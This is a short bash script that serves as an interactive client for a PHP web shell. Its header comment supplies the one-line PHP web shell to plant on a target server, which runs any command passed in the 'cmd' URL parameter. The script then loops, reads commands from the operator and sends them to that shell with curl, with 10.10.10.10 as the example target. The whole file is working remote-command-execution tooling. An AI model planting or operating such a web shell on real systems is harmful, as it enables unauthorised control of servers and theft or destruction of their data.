#!/bin/bash
#  ___           __       ______      ___  __ _____      ______        ____
#  / _ )___ ____ / /  ____/  _/ /_____/ _ \/ // / _ \____/ __/ /  ___ / / /
# / _  / _ `(_-</ _ \/___// // __/___/ ___/ _  / ___/___/\ \/ _ \/ -_) / /
#/____/\_,_/___/_//_/   /___/\__/   /_/  /_//_/_/      /___/_//_/\__/_/_/
# This is a simple BASH script to make it easier to interact with a PHP Web Shell
###############################################################
# Here is the contents of the PHP file you will want to create on the server
# <?php echo shell_exec($_GET['cmd']);?>
###############################################################
# Example URL to enter http://[host]/[path]/[file]?cmd=
# Example URL to enter http://10.10.10.10/web/spoonman2.php?cmd=
echo "Example URL http://10.10.10.10/web/spoonman2.php?cmd="
echo -n "What is the URL to the PHP shell?  :"
read url
clear 
echo Enter the command you want to run below 
echo '######################################'
# Now Doing the Loop to  execute the commands: 
###############################################################
while true;
do 
	IFS= read -r -p "~# " command
	urlenc=$( echo "$command" | sed 's/ /%20/g' )
	curl $url$urlenc
done
